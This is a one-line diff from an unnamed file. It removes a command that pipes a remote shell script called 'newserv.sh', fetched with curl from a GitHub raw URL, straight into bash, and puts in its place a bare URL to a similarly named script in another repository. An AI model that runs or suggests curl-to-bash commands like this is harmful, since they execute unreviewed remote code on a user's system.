@@ -1,1 +1,1 @@
-curl -s https://raw.githubusercontent.com/dench7/123/main/newserv.sh | bash
+https://raw.githubusercontent.com/dench7/wave2/main/newserv.sh
